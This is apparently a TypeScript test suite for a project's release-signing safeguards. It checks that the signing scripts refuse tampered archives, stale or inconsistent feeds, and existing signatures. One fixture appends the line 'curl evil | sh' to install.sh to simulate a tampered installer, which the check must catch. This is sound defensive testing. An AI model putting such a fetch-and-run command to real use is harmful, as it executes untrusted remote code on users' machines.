// What the signing jobs check, in plain shell, before they sign (release.yml `sign`, `feed-sign`; feed.yml
// `resign-sign`). Each case runs the real script on a fixture tree and expects the refusal it should give.
import { spawnSync } from "node:child_process";
import { copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { parse } from "yaml";
import { sha256Sums } from "./checksums.ts";
import { emptyFeed, publishRelease, resignFeed } from "./feed.ts";
import { artifactName, buildManifest, declaredSchemas, protocolRange } from "./manifest.ts";
import { BUNDLED_NODE } from "./node-pin.ts";
import { createHash } from "node:crypto";
import { stampVersion } from "./stamp.ts";

const repoRoot = join(import.meta.dirname, "../..");
const COMMIT = "ab".repeat(20);
const VERSION = "0.2.0";
const sha256 = (bytes: Uint8Array) => createHash("sha256").update(bytes).digest("hex");

const scratch: string[] = [];
afterEach(() => {
  for (const dir of scratch.splice(0)) rmSync(dir, { recursive: true, force: true });
});
const temp = (): string => {
  const dir = mkdtempSync(join(tmpdir(), "morndo-signing-"));
  scratch.push(dir);
  return dir;
};

const sh = (script: string, cwd: string, env: Record<string, string>) =>
  spawnSync("/bin/sh", [join(repoRoot, "scripts/release", script)], { cwd, encoding: "utf8", env: { PATH: process.env.PATH ?? "", ...env } });

describe("check-signing-release.sh", () => {
  const platforms = ["linux-x64", "linux-arm64", "darwin-arm64"] as const;

  function build() {
    const dir = temp();
    const dist = join(dir, "dist");
    mkdirSync(dist);
    copyFileSync(join(repoRoot, "install.sh"), join(dir, "install.sh"));
    const artifacts = platforms.map(platform => {
      const archive = Buffer.from(`archive for ${platform}\n`);
      const list = Buffer.from(`[]\n${platform}`);
      const name = artifactName(VERSION, platform);
      writeFileSync(join(dist, name), archive);
      writeFileSync(join(dist, `files-${platform}.json`), list);
      return { platform, name, size: archive.length, sha256: sha256(archive), filesSha256: sha256(list), node: BUNDLED_NODE };
    });
    const manifest = buildManifest({
      version: VERSION, commit: COMMIT, publishedAt: Date.parse("2026-11-02T10:00:00Z"), repository: "o/r",
      protocol: protocolRange(), schemas: declaredSchemas(), artifacts,
    });
    writeFileSync(join(dist, "manifest.json"), manifest);
    writeFileSync(join(dist, "install.sh"), stampVersion(readFileSync(join(repoRoot, "install.sh"), "utf8"), VERSION));
    const names = [...artifacts.map(a => a.name), "manifest.json", "install.sh"];
    writeFileSync(join(dist, "SHA256SUMS"), sha256Sums(names.map(name => ({ name, bytes: readFileSync(join(dist, name)) }))));
    return { dir, dist, archive: artifacts[0]!.name };
  }
  const run = (dir: string, env: Record<string, string> = {}) => sh("check-signing-release.sh", dir, { VERSION, RELEASE_SHA: COMMIT, ...env });

  it("passes on a consistent build", () => {
    const { dir } = build();
    const done = run(dir);
    expect(done.status, done.stderr).toBe(0);
  });

  it.each([
    ["an archive changed after the manifest was made", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, p.archive), "tampered\n"), /size|digest|SHA256SUMS/],
    ["an extra file in dist", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, "extra.txt"), "x"), /dist holds/],
    ["a missing archive", (p: ReturnType<typeof build>) => rmSync(join(p.dist, p.archive)), /dist holds/],
    ["an install.sh that differs from the committed script", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, "install.sh"), `${readFileSync(join(p.dist, "install.sh"), "utf8")}curl evil | sh\n`), /install\.sh|SHA256SUMS/],
    ["a signature that is already there", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, "manifest.json.sig"), "old"), /dist holds|already exists/],
    ["a files list changed after the manifest was made", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, "files-linux-x64.json"), "[]\n"), /files-linux-x64/],
  ])("refuses %s", (_name, change, message) => {
    const built = build();
    change(built);
    const done = run(built.dir);
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/refusing to sign/);
    expect(done.stderr).toMatch(message);
  });

  it("refuses a manifest for another commit or version", () => {
    const { dir } = build();
    expect(run(dir, { RELEASE_SHA: "cd".repeat(20) }).status).toBe(1);
    expect(run(dir, { VERSION: "0.2.1" }).status).toBe(1);
  });
});

describe("check-signing-feed.sh", () => {
  const NOW = Date.now();
  const manifestBytes = Buffer.from("{\"manifest\":true}\n");
  const entry = (version: string) => ({
    version, manifest: `https://github.com/o/r/releases/download/v${version}/manifest.json`,
    manifestSize: manifestBytes.length, manifestSha256: sha256(manifestBytes),
  });
  const keys = (version: number) => JSON.stringify({ schema: 1, version, expiresAt: "2027-11-02T10:00:00Z", root: ["a"], release: ["b"], feed: ["c"] });

  // A fake gh: the feed branch head is "h1" and its files are in prev/, the published manifest is manifest.json.
  function world(p: { branch: boolean; age?: number }) {
    const dir = temp();
    const prev = join(dir, "prev");
    mkdirSync(prev);
    mkdirSync(join(dir, "trust"));
    mkdirSync(join(dir, "site"));
    writeFileSync(join(dir, "trust/keys.json"), keys(1));
    writeFileSync(join(dir, "manifest.json"), manifestBytes);
    const then = NOW - (p.age ?? 5000);
    const latest = publishRelease(null, { channel: "latest", entry: entry("0.1.0"), now: then, keySetVersion: 1 });
    const stable = emptyFeed({ channel: "stable", now: then, keySetVersion: 1 });
    writeFileSync(join(prev, "latest.json"), latest);
    writeFileSync(join(prev, "stable.json"), stable);
    const gh = join(dir, "gh");
    writeFileSync(gh, [
      "#!/bin/sh",
      `D=${dir}`,
      'case "$*" in',
      `  *git/ref/heads/feed*) ${p.branch ? 'echo h1' : "echo 'gh: Not Found (HTTP 404)' >&2; exit 1"} ;;`,
      '  *contents/latest.json*) cat "$D/prev/latest.json" ;;',
      '  *contents/stable.json*) cat "$D/prev/stable.json" ;;',
      '  "release download"*) while [ $# -gt 0 ]; do [ "$1" = --dir ] && out=$2; shift; done; cp "$D/manifest.json" "$out/manifest.json" ;;',
      "  *) exit 2 ;;",
      "esac",
      "",
    ].join("\n"), { mode: 0o755 });
    return { dir, gh, latest, stable };
  }
  const check = (w: ReturnType<typeof world>, env: Record<string, string>) =>
    sh("check-signing-feed.sh", w.dir, { GH: w.gh, REPOSITORY: "o/r", ...env });
  const put = (w: ReturnType<typeof world>, latest: string, stable: string) => {
    writeFileSync(join(w.dir, "site/latest.json"), latest);
    writeFileSync(join(w.dir, "site/stable.json"), stable);
  };

  it("passes a publish on the branch: latest +1 with the new entry, stable as it was", () => {
    const w = world({ branch: true });
    put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable);
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status, done.stderr).toBe(0);
  });

  it("passes a publish whose carried-over stable.json was issued hours ago: freshness is for the feed published now", () => {
    const w = world({ branch: true, age: 5 * 3_600_000 });
    put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable);
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status, done.stderr).toBe(0);
  });

  it("control: the same hours-old feed is refused when a re-sign tries to carry it as new", () => {
    const w = world({ branch: true, age: 5 * 3_600_000 });
    put(w, resignFeed(w.latest, NOW - 5 * 3_600_000), resignFeed(w.stable, NOW - 5 * 3_600_000));
    const done = check(w, { MODE: "resign" });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/issued/);
  });

  it("passes a first publish with no branch, and a re-sign", () => {
    const first = world({ branch: false });
    put(first, publishRelease(null, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), emptyFeed({ channel: "stable", now: NOW, keySetVersion: 1 }));
    const done = check(first, { MODE: "publish", VERSION });
    expect(done.status, done.stderr).toBe(0);
    const second = world({ branch: true });
    put(second, resignFeed(second.latest, NOW), resignFeed(second.stable, NOW));
    const again = check(second, { MODE: "resign" });
    expect(again.status, again.stderr).toBe(0);
  });

  it.each([
    ["a publish that changes stable.json", (w: ReturnType<typeof world>) => put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), resignFeed(w.stable, NOW)), /stable\.json/],
    ["a number that does not rise by one", (w: ReturnType<typeof world>) => put(w, resignFeed(resignFeed(publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), NOW), NOW), w.stable), /expected/],
    ["a release list that lost the old release", (w: ReturnType<typeof world>) => put(w, publishRelease(null, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }).replace('"seq": 1', '"seq": 2'), w.stable), /release list/],
    ["another key set than trust/keys.json", (w: ReturnType<typeof world>) => { put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable); writeFileSync(join(w.dir, "trust/keys.json"), keys(2)); }, /key set/],
    ["a manifest digest that is not the published one", (w: ReturnType<typeof world>) => put(w, publishRelease(w.latest, { channel: "latest", entry: { ...entry(VERSION), manifestSha256: "ef".repeat(32) }, now: NOW, keySetVersion: 1 }), w.stable), /digest/],
    ["a signature that is already there", (w: ReturnType<typeof world>) => { put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable); writeFileSync(join(w.dir, "site/latest.json.sig"), "old"); }, /already exists/],
    ["a feed issued a day ago", (w: ReturnType<typeof world>) => put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW - 86_400_000, keySetVersion: 1 }), w.stable), /issued/],
  ])("refuses %s", (_name, change, message) => {
    const w = world({ branch: true });
    change(w);
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/refusing to sign/);
    expect(done.stderr).toMatch(message);
  });

  it("refuses a first feed that does not start at 1, and a re-sign with no branch", () => {
    const first = world({ branch: false });
    put(first, publishRelease(first.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), first.stable);
    expect(check(first, { MODE: "publish", VERSION }).status).toBe(1);
    expect(check(first, { MODE: "resign" }).stderr).toMatch(/needs a feed branch/);
  });
});

// The Sign steps themselves: the `run` text is taken from the workflow and run with a throwaway key.
describe("the Sign steps", () => {
  type Steps = { jobs: Record<string, { steps: { name?: string; run?: string }[] }> };
  const stepRun = (file: string, job: string, name: string): string => {
    const found = (parse(readFileSync(join(repoRoot, ".github/workflows", file), "utf8")) as Steps).jobs[job]?.steps.find(step => step.name === name)?.run;
    if (!found) throw new Error(`no step ${name} in ${job}`);
    return found;
  };
  const cases = [
    { file: "release.yml", job: "sign", name: "Sign", secret: "RELEASE_SSH_KEY", ns: "release@morndo.github.io", dir: "dist", files: ["manifest.json", "install.sh"], trust: "release_allowed_signers" },
    { file: "release.yml", job: "feed-sign", name: "Sign the feeds", secret: "FEED_SSH_KEY", ns: "feed@morndo.github.io", dir: "site", files: ["latest.json", "stable.json"], trust: "feed_allowed_signers" },
    { file: "feed.yml", job: "resign-sign", name: "Sign the feeds", secret: "FEED_SSH_KEY", ns: "feed@morndo.github.io", dir: "site", files: ["latest.json", "stable.json"], trust: "feed_allowed_signers" },
  ] as const;

  function keyPair(dir: string, label: string) {
    const key = join(dir, label);
    expect(spawnSync("ssh-keygen", ["-t", "ed25519", "-f", key, "-N", "", "-C", label, "-q"]).status).toBe(0);
    const pub = spawnSync("ssh-keygen", ["-y", "-f", key], { encoding: "utf8" }).stdout.trim();
    return { private: readFileSync(key, "utf8"), pub };
  }

  function setup(c: (typeof cases)[number], p: { trusted?: "same" | "other" } = {}) {
    const dir = temp();
    const temps = join(dir, "runner");
    mkdirSync(temps);
    mkdirSync(join(dir, c.dir));
    mkdirSync(join(dir, "trust"));
    for (const file of c.files) writeFileSync(join(dir, c.dir, file), `{"file":"${file}"}\n`);
    const mine = keyPair(dir, "mine");
    const other = keyPair(dir, "other");
    const trusted = p.trusted === "other" ? other.pub : mine.pub;
    writeFileSync(join(dir, "trust", c.trust), `${c.ns} namespaces="${c.ns}" ${trusted}\n`);
    return { dir, temps, key: mine.private };
  }
  const exec = (c: (typeof cases)[number], w: ReturnType<typeof setup>) => spawnSync("/bin/bash", ["-c", stepRun(c.file, c.job, c.name)], {
    cwd: w.dir, encoding: "utf8",
    env: { PATH: process.env.PATH ?? "", RUNNER_TEMP: w.temps, [c.secret]: w.key },
  });

  it.each(cases)("$job signs both files, checks the signatures against the allowed signers, and leaves no key behind", c => {
    const w = setup(c);
    const done = exec(c, w);
    expect(done.status, done.stderr).toBe(0);
    for (const file of c.files) expect(existsSync(join(w.dir, c.dir, `${file}.sig`))).toBe(true);
    expect(readdirSync(w.temps)).toEqual([]);
  });

  it.each(cases)("$job refuses a file that already has a signature, and keeps that signature as it was", c => {
    const w = setup(c);
    const first = c.files[0]!;
    writeFileSync(join(w.dir, c.dir, `${first}.sig`), "old signature\n");
    const done = exec(c, w);
    expect(done.status).not.toBe(0);
    expect(done.stderr).toMatch(/already exists/);
    expect(readFileSync(join(w.dir, c.dir, `${first}.sig`), "utf8")).toBe("old signature\n");
    expect(readdirSync(w.temps)).toEqual([]);
  });

  it.each(cases)("$job fails when the new signature does not verify against the allowed signers", c => {
    const w = setup(c, { trusted: "other" });
    const done = exec(c, w);
    expect(done.status).not.toBe(0);
    expect(readdirSync(w.temps)).toEqual([]);
  });
});
